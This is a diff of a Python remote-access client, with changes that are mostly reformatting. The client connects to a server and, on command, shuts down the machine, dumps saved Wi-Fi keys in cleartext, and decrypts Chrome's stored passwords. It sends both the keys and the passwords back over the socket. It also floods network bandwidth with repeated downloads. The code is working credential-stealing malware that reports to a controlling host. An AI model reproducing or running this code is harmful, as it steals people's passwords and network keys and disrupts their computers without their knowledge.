@@ -5,7 +5,8 @@ from multiprocessing.dummy import Pool as ThreadPool
 from urllib.request import urlopen
 
 s = socket.socket()
-host = os.environ['COMPUTERNAME']  # author's PC is: "BlueEyesPC"; alt:  input(str("enter server addr: "))
+host = os.environ["COMPUTERNAME"]
+# author's PC is: "BlueEyesPC"; alt:  input(str("enter server addr: "))
 port = 8080
 s.connect((host, port))
 
@@ -75,21 +76,21 @@ while 1:
             s.send("bad command".encode())
 
     elif command == "9":
-        # Shutdown PC 
+        # Shutdown PC
         # https://stackoverflow.com/a/40319875
         # os.system("echo Hello W0rld")
 
         # https://stackoverflow.com/a/50824776/5728614
         import sys
 
-        if sys.platform == 'win32':
+        if sys.platform == "win32":
             import ctypes
 
-            user32 = ctypes.WinDLL('user32')
+            user32 = ctypes.WinDLL("user32")
             user32.ExitWindowsEx(0x00000008, 0x00000000)
 
         else:
-            os.system('sudo shutdown now')
+            os.system("sudo shutdown now")
         # os.system('shutdown /p /f')# alt shutdown /s
 
     elif command == "10":
@@ -98,11 +99,20 @@ while 1:
         import subprocess
 
         string = ""
-        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
+        data = (
+            subprocess.check_output(["netsh", "wlan", "show", "profiles"])
+            .decode("utf-8")
+            .split("\n")
+        )
         profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
         for i in profiles:
-            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode(
-                'utf-8').split('\n')
+            results = (
+                subprocess.check_output(
+                    ["netsh", "wlan", "show", "profile", i, "key=clear"]
+                )
+                .decode("utf-8")
+                .split("\n")
+            )
             results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
             try:
                 print("{:<30}|  {:<}".format(i, results[0]))
@@ -112,7 +122,6 @@ while 1:
             string += "\n"
 
         s.send(str(string).encode())
-
 
     elif command == "11":
         # Get Chrome passwords list
@@ -135,8 +144,7 @@ while 1:
             pass
         conn = connect(path2)
         cursor = conn.cursor()
-        cursor.execute(
-            'SELECT action_url, username_value, password_value FROM logins')
+        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
 
         sites = []
         for raw in cursor.fetchall():
@@ -146,10 +154,9 @@ while 1:
             ## raw[2] = binary
             try:
                 if raw[0] not in sites:
-                    # print(format(win32crypt.CryptUnprotectData(raw[2])[1]))
+                    print(format(win32crypt.CryptUnprotectData(raw[2])[1]))
 
-                    chrome_passwords += '\n' + "Website: " + raw[0] + '\n' + "User/email: " + raw[
-                        1] + '\n' + "Password: " + format(win32crypt.CryptUnprotectData(raw[2])[1]) + '\n')
+                    chrome_passwords += f"\nWebsite: {raw[0]}\nUser/email: {raw[1]}\nPassword: {format(win32crypt.CryptUnprotectData(raw[2])[1])}\n"
 
                     sites.append(raw[0])
             except:
@@ -162,6 +169,7 @@ while 1:
         # Original project: https://github.com/alik604/bandwidth-hog/blob/master/bandwidth-hog.py
         URL = s.recv().decode()
         try:
+
             def doneloadInChucksButDoNotSave(URL=URL):
                 response = urlopen(URL)
                 CHUNK_SIZE = 16 * 1024
@@ -170,14 +178,13 @@ while 1:
                     if not chunk:
                         break
 
-
             listOfURLsToDownload = [URL for i in range(1000)]
             pool = ThreadPool(4)
             for i in range(5):
                 results = pool.map(doneloadInChucksButDoNotSave, listOfURLsToDownload)
                 pool.close()
                 pool.join()
-                print('Itration done')
+                print("Itration done")
         except Exception as e:
             print("Error with Bandwidth Hog", e)
         s.send("Done".encode())
